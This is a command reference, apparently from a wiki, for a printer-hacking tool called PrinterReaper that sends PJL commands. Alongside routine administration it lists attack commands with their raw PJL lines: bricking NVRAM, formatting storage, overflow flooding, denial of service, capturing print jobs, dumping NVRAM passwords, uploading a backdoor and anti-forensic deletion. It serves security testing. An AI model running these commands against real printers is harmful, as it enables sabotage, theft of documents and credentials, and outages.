# 🔧 PJL Commands - Complete Reference

Detailed documentation of all PJL (Printer Job Language) commands in PrinterReaper.

---

## 📋 Table of Contents

- [Filesystem Commands](#-filesystem-commands)
- [Information Commands](#ℹ️-information-commands)
- [Control Commands](#⚙️-control-commands)
- [Security Commands](#-security-commands)
- [Attack Commands](#-attack-commands)
- [Network Commands](#-network-commands)
- [Monitoring Commands](#-monitoring-commands)

---

## 📁 Filesystem Commands

### ls - List Directory Contents

Lists files and directories in the printer's filesystem.

**Syntax:**
```
ls [path]
```

**Examples:**
```bash
ls                    # List current directory
ls /etc               # List /etc directory
ls 0:/                # List volume 0
ls /webServer         # List webServer directory
```

**Notes:**
- Shows 'd' for directories, '-' for files
- File sizes displayed in bytes
- Works across all volumes (0:, 1:, 2:, etc.)

---

### mkdir - Create Directory

Creates a new directory on the printer.

**Syntax:**
```
mkdir <directory>
```

**Examples:**
```bash
mkdir /tmp/backup     # Create backup directory
mkdir 0:/test         # Create on volume 0
mkdir newdir          # Create in current directory
```

**Notes:**
- Parent directories must exist
- Some printers have filesystem restrictions
- May fail on read-only volumes

---

### find - Recursive File Listing

Walks through directory tree and lists all files.

**Syntax:**
```
find [path]
```

**Examples:**
```bash
find                  # Find all files from root
find 0:/              # Find all files on volume 0
find /webServer       # Find files in webServer
```

**Notes:**
- May take time on large filesystems
- Shows full paths
- Useful for discovering hidden files
- Respects volume boundaries

---

### upload - Upload File to Printer

Transfers local file to printer's filesystem using PJL FSUPLOAD.

**Syntax:**
```
upload <local_file> [remote_path]
```

**Examples:**
```bash
upload config.txt                    # Upload to root
upload /path/file.cfg 0:/file.cfg   # Upload to specific location
upload backdoor.ps 1:/backdoor.ps    # Upload to volume 1
```

**Notes:**
- Local file must exist and be readable
- Remote path optional (uses basename if omitted)
- File size automatically calculated
- Binary transfer supported

**PJL Command Used:**
```
@PJL FSUPLOAD NAME="<path>" OFFSET=0 LENGTH=<size>
<binary data>
```

---

### download - Download File from Printer

Retrieves file from printer's filesystem using PJL FSDOWNLOAD.

**Syntax:**
```
download <remote_file> [local_path]
```

**Examples:**
```bash
download config.cfg                  # Download to current directory
download 0:/passwd /tmp/passwd       # Download with different name
download 1:/backup.cfg backup.cfg    # Download from volume 1
```

**Notes:**
- Remote file must exist and be readable
- Preserves binary data
- Useful for exfiltrating configuration files
- Can download from any accessible volume

**PJL Command Used:**
```
@PJL FSDOWNLOAD NAME="<path>"
```

---

### pjl_delete - Delete Remote File

Permanently deletes file from printer using PJL FSDELETE.

**Syntax:**
```
pjl_delete <file>
```

**Examples:**
```bash
pjl_delete old.log              # Delete file
pjl_delete 0:/tmp/temp.cfg      # Delete specific file
pjl_delete /webServer/test      # Delete from webServer
```

**Notes:**
- ⚠️ Permanent operation - cannot be undone
- File must be writable
- May be blocked by security settings
- Use for anti-forensics or cleanup

**PJL Command Used:**
```
@PJL FSDELETE NAME="<path>"
```

---

### copy - Copy Remote File

Creates duplicate of file on printer.

**Syntax:**
```
copy <source> <destination>
```

**Examples:**
```bash
copy config.cfg config.bak           # Backup configuration
copy 0:/file.txt 1:/file.txt         # Copy between volumes
copy passwd passwd.original          # Save original
```

**Notes:**
- Implements download + upload
- Source must be readable
- Destination will be overwritten
- Useful for creating backups

**Implementation:**
- Downloads source file
- Uploads to destination

---

### move - Move/Rename File

Moves file from one location to another.

**Syntax:**
```
move <source> <destination>
```

**Examples:**
```bash
move old.cfg new.cfg                 # Rename file
move 0:/file.txt 1:/file.txt         # Move between volumes
move /tmp/test /backup/test          # Move to different directory
```

**Notes:**
- Source file deleted after successful copy
- Destination overwritten if exists
- Use `copy` to keep original
- Cannot be undone

**Implementation:**
- Copies source to destination
- Deletes original source file

---

### touch - Create Empty File

Creates zero-length file or updates timestamp.

**Syntax:**
```
touch <file>
```

**Examples:**
```bash
touch newfile.txt         # Create empty file
touch 0:/marker           # Create marker file
touch /tmp/test.log       # Create empty log
```

**Notes:**
- Creates zero-length file
- File created if doesn't exist
- Some printers may update timestamp instead
- Useful for placeholder files

**PJL Command Used:**
```
@PJL FSUPLOAD NAME="<file>" OFFSET=0 LENGTH=0
```

---

### chmod - Change File Permissions

Attempts to change file permissions using PJL FSSETATTR.

**Syntax:**
```
chmod <permissions> <file>
```

**Examples:**
```bash
chmod 644 config.cfg      # Read/write for owner
chmod 755 script.sh       # Executable permissions
chmod 0 protected.txt     # Remove all permissions
```

**Notes:**
- ⚠️ Not all printers support chmod
- Permission format varies by printer
- Use `permissions` to test access
- Some printers ignore this command

**PJL Command Used:**
```
@PJL FSSETATTR NAME="<file>" ATTR=<perms>
```

---

### permissions - Test File Permissions

Tests if file is accessible using PJL FSQUERY.

**Syntax:**
```
permissions <file>
```

**Examples:**
```bash
permissions config.cfg        # Test if accessible
permissions /etc/passwd       # Test sensitive file
permissions 0:/protected      # Test protected file
```

**Notes:**
- Reports accessible or not accessible
- Useful for permission enumeration
- Doesn't show specific permission bits
- Part of security testing toolkit

---

### rmdir - Remove Directory

Deletes empty directory from printer.

**Syntax:**
```
rmdir <directory>
```

**Examples:**
```bash
rmdir olddir              # Remove empty directory
rmdir 0:/tmp              # Remove tmp
rmdir /backup             # Remove backup folder
```

**Notes:**
- Directory must be empty
- Use `pjl_delete` for files first
- Cannot be undone
- Some printers may not support

**PJL Command Used:**
```
@PJL FSDELETE NAME="<directory>"
```

---

### mirror - Mirror Filesystem

Recursively downloads entire directory tree.

**Syntax:**
```
mirror [path]
```

**Examples:**
```bash
mirror                    # Mirror entire filesystem
mirror 0:/                # Mirror volume 0
mirror /webServer         # Mirror webServer only
```

**Notes:**
- Creates local directory structure
- Downloads all accessible files
- May take considerable time
- Excellent for forensics and backup
- Preserves directory hierarchy

---

## ℹ️ Information Commands

### id - Printer Identification

Shows comprehensive printer identification and system information.

**Syntax:**
```
id
```

**Output Includes:**
- Device ID
- Firmware/version information
- Product information
- Page count

**PJL Commands Used:**
```
@PJL INFO ID
@PJL INFO CONFIG
@PJL INFO PRODUCT
@PJL INFO PAGECOUNT
```

---

### variables - List Environment Variables

Lists all PJL environment variables.

**Syntax:**
```
variables
```

**PJL Command Used:**
```
@PJL INFO VARIABLES
```

**Common Variables:**
- TIMEOUT
- COPIES
- DUPLEX
- RESOLUTION
- JOBMEDIA
- PERSONALITY

---

### printenv - Show Specific Variable

Displays value of specific environment variable.

**Syntax:**
```
printenv <VAR>
```

**Examples:**
```bash
printenv TIMEOUT          # Show timeout value
printenv COPIES           # Show copies setting
printenv RESOLUTION       # Show resolution
```

**PJL Command Used:**
```
@PJL DINQUIRE <VAR>
```

---

### network - Network Information

Shows comprehensive network configuration.

**Syntax:**
```
network
```

**Output Includes:**
- IP address
- Subnet mask
- Gateway
- MAC address
- DHCP status
- WiFi information (if available)

**PJL Commands Used:**
```
@PJL INFO NETWORK
@PJL INFO IP
@PJL INFO WIFI
```

---

### info - Get Printer Information

Retrieves various types of printer information.

**Syntax:**
```
info <category>
```

**Categories:**
- `config` - Configuration information
- `filesys` - File system information
- `id` - Printer model number
- `memory` - Available memory
- `pagecount` - Pages printed
- `status` - Current status
- `variables` - Environment variables

**Examples:**
```bash
info config               # Get configuration
info memory               # Get memory info
info status               # Get current status
```

---

## ⚙️ Control Commands

### set - Set Environment Variable

Sets PJL environment variable value.

**Syntax:**
```
set <VAR=VALUE>
```

**Examples:**
```bash
set TIMEOUT=90            # Set timeout to 90
set COPIES=2              # Set copies to 2
set DUPLEX=ON             # Enable duplex
```

**PJL Command Used:**
```
@PJL SET <VAR>=<VALUE>
```

**Common Variables:**
- TIMEOUT - Command timeout
- COPIES - Number of copies
- DUPLEX - Duplex mode (ON/OFF)
- RESOLUTION - Print resolution
- JOBMEDIA - Paper type

---

### display - Set Display Message

Changes message on printer's control panel.

**Syntax:**
```
display <message>
```

**Examples:**
```bash
display "System Maintenance"         # Maintenance message
display "Printer hacked"             # Demonstration
display "Out of service"             # Service notice
```

**Notes:**
- Message length limited by printer
- Can be used for social engineering
- Display reverts after timeout
- Some printers ignore this

**PJL Command Used:**
```
@PJL DISPLAY "<message>"
```

---

### offline - Take Printer Offline

Takes printer offline with custom message.

**Syntax:**
```
offline <message>
```

**Examples:**
```bash
offline "Under maintenance"          # Maintenance mode
offline "Reserved for testing"       # Reserve printer
offline "System upgrade"             # Upgrade notice
```

**Notes:**
- Printer stops accepting jobs
- Requires manual intervention to restore
- ⚠️ Can be used for denial of service
- Some printers ignore this

**PJL Command Used:**
```
@PJL OFFLINE "<message>"
```

---

### restart - Restart Printer

Performs soft reset of printer.

**Syntax:**
```
restart
```

**Notes:**
- Clears job queue
- Printer offline during restart
- Settings preserved
- Takes 30-60 seconds
- ⚠️ Disruptive to operations

**PJL Command Used:**
```
@PJL RESET
```

---

### reset - Factory Reset

Resets all settings to factory defaults.

**Syntax:**
```
reset
```

**Notes:**
- ⚠️⚠️⚠️ **DESTRUCTIVE OPERATION**
- All settings will be lost
- Network configuration reset
- Requires 'yes' confirmation
- Cannot be undone
- Printer needs reconfiguration after

**PJL Command Used:**
```
@PJL DEFAULT
```

---

### selftest - Printer Self-Tests

Runs diagnostic tests on printer.

**Syntax:**
```
selftest
```

**Test Options:**
1. Print test page - Tests print engine
2. Network test - Tests connectivity
3. Memory test - Tests RAM
4. All tests - Complete diagnostic

**PJL Commands Used:**
```
@PJL TESTPAGE
@PJL NETTEST
@PJL MEMTEST
@PJL SELFTEST
```

---

### backup - Backup Configuration

Saves printer configuration to local file.

**Syntax:**
```
backup <filename>
```

**Examples:**
```bash
backup config.backup              # Save configuration
backup printer_20251004.cfg       # Timestamped backup
```

**Notes:**
- Saves to local file
- Does not include print jobs
- Use before making risky changes

**PJL Command Used:**
```
@PJL INFO CONFIG
```

---

### restore - Restore Configuration

Loads previously saved configuration.

**Syntax:**
```
restore <filename>
```

**Examples:**
```bash
restore config.backup             # Restore from backup
restore /backups/printer.cfg      # Restore from path
```

**Notes:**
- Backup file must exist
- Manual configuration may be required
- Not all settings restorable via PJL
- May require restart

---

## 🔒 Security Commands

### lock - Lock Control Panel

Sets PIN to lock control panel and disk access.

**Syntax:**
```
lock [PIN]
```

**Examples:**
```bash
lock 12345                # Lock with PIN
lock                      # Prompt for PIN
```

**Notes:**
- PIN must be 1-65535
- Remember PIN - recovery may not be possible
- Prevents unauthorized changes
- ⚠️ Can be used for DoS

**PJL Command Used:**
```
@PJL SET LOCKPIN=<PIN>
```

---

### unlock - Unlock Control Panel

Removes PIN lock from printer.

**Syntax:**
```
unlock [PIN]
```

**Examples:**
```bash
unlock 12345              # Unlock with PIN
unlock                    # Prompt for PIN
```

**Notes:**
- Requires correct PIN
- Setting PIN to 0 removes lock
- Use `unlock_bruteforce` for PIN recovery

**PJL Command Used:**
```
@PJL SET LOCKPIN=0
```

---

### disable - Disable Printer

Disables printer by setting incompatible media settings.

**Syntax:**
```
disable
```

**Notes:**
- ⚠️ Printer rejects print jobs
- Denial of service attack
- May require manual recovery
- Use with extreme caution

**PJL Commands Used:**
```
@PJL DINQUIRE JOBMEDIA
@PJL SET JOBMEDIA=OFF
```

---

### nvram - NVRAM Operations

Accesses non-volatile RAM containing settings and passwords.

**Syntax:**
```
nvram <dump|set|get> [options]
```

**Operations:**
- `dump` - Dump entire NVRAM contents
- `set` - Set NVRAM value (not implemented)
- `get` - Get NVRAM value (not implemented)

**Examples:**
```bash
nvram dump                # Dump all NVRAM
```

**Notes:**
- May contain sensitive information
- Passwords may be stored here
- Useful for information disclosure
- Some data may be encrypted
- Vendor-specific implementation

**PJL Command Used:**
```
@PJL INFO NVRAM
```

---

## 💥 Attack Commands

### destroy - Physical NVRAM Damage

**⚠️⚠️⚠️ DESTRUCTIVE ATTACK ⚠️⚠️⚠️**

Attempts to cause physical damage to printer's NVRAM.

**Syntax:**
```
destroy
```

**Warnings:**
- ⚠️ MAY CAUSE PERMANENT HARDWARE DAMAGE
- ⚠️ CANNOT BE UNDONE
- ⚠️ FOR RESEARCH PURPOSES ONLY
- ⚠️ REQUIRES EXPLICIT CONFIRMATION

**Notes:**
- Use only in authorized testing
- May brick the printer
- Requires 'yes' confirmation
- Legal and ethical implications

**PJL Command Used:**
```
@PJL SET NVRAM=0
```

---

### flood - Buffer Overflow Test

Floods printer input to test for buffer overflow vulnerabilities.

**Syntax:**
```
flood [size]
```

**Examples:**
```bash
flood                     # Flood with 10000 bytes
flood 50000               # Flood with 50000 bytes
flood 100000              # Large flood test
```

**Notes:**
- Default size: 10000 bytes
- ⚠️ May crash or hang printer
- Used to discover vulnerabilities
- Printer may need restart after

**PJL Command Used:**
```
@PJL DISPLAY "<AAAA...repeating>"
```

---

### hold - Enable Job Retention

Enables job retention mode.

**Syntax:**
```
hold
```

**Notes:**
- Jobs held in memory instead of printing
- Use `capture` to retrieve jobs
- May fill printer memory
- Useful for job capture attacks

**PJL Command Used:**
```
@PJL SET JOBRETENTION=ON
```

---

### format - Format Filesystem

**⚠️⚠️⚠️ DESTRUCTIVE OPERATION ⚠️⚠️⚠️**

Formats printer's mass storage device.

**Syntax:**
```
format
```

**Warnings:**
- ⚠️ ALL DATA WILL BE LOST
- ⚠️ CANNOT BE UNDONE
- ⚠️ REQUIRES CONFIRMATION

**Notes:**
- Erases all files and directories
- Requires 'yes' confirmation
- Use for cleanup or anti-forensics
- Printer filesystem will be empty

**PJL Command Used:**
```
@PJL FORMAT
```

---

### capture - Capture Print Jobs

Captures all print jobs sent to printer.

**Syntax:**
```
capture
```

**Notes:**
- Stores jobs in exfiltrated/ directory
- Enable `hold` for job retention
- May capture sensitive documents
- Ethical considerations apply

---

### traverse - Path Traversal Attack

Tests for path traversal vulnerabilities.

**Syntax:**
```
traverse
```

**Tests:**
- `../` traversal patterns
- `..\\` Windows patterns  
- Volume-based traversal
- Absolute path bypass
- Sensitive file access

---

### dos_* - Denial of Service Attacks

Multiple DoS attack vectors:

**dos_display**
```bash
dos_display               # Spam display messages
```

**dos_jobs**
```bash
dos_jobs                  # Flood with print jobs
```

**dos_connections**
```bash
dos_connections           # Connection exhaustion
```

---

## 🌐 Network Commands

### direct - Direct Print Configuration

Shows direct-print configuration.

**Syntax:**
```
direct
```

**PJL Command Used:**
```
@PJL INFO DIRECT
```

---

### execute - Execute Raw PJL

Sends arbitrary PJL command to printer.

**Syntax:**
```
execute <command>
```

**Examples:**
```bash
execute @PJL INFO STATUS         # Get status
execute @PJL SET TIMEOUT=90      # Set timeout
execute @PJL INQUIRE COPIES      # Query setting
```

**Notes:**
- Command sent as-is
- No validation performed
- Requires PJL knowledge
- ⚠️ May crash printer if invalid

---

## 📊 Monitoring Commands

### pagecount - Page Counter

Shows or manipulates printer's page counter.

**Syntax:**
```
pagecount [number]
```

**Examples:**
```bash
pagecount                 # Show current count
pagecount 1000            # Set count to 1000
pagecount 0               # Reset counter
```

**PJL Commands Used:**
```
@PJL INFO PAGECOUNT
@PJL SET PAGECOUNT=<number>
```

---

### status - Toggle Status Messages

Enables/disables PJL status messages.

**Syntax:**
```
status
```

**Notes:**
- Shows detailed printer responses
- Useful for debugging
- Can be verbose

---

## 🎯 Advanced PJL Features

### File System Operations

PrinterReaper supports full filesystem access:
- Browse directories
- Download/upload files
- Create/delete files
- Copy/move files
- Change permissions
- Mirror entire filesystem

### NVRAM Access

Access non-volatile RAM:
- Dump NVRAM contents
- Extract passwords
- Analyze configuration
- Modify settings

### Job Control

Control print jobs:
- Enable retention
- Capture jobs
- Manipulate queue
- Intercept documents

---

## 📚 Related Pages

- **[Commands Reference](Commands-Reference)** - All commands overview
- **[Security Testing](Security-Testing)** - Testing workflows
- **[Attack Vectors](Attack-Vectors)** - Exploitation methods
- **[Examples](Examples)** - Practical scenarios

---

<div align="center">

**PJL Commands Reference**  
For interactive help, use `help <command>` in the PrinterReaper shell

**→ [Next: Security Testing](Security-Testing)**

</div>

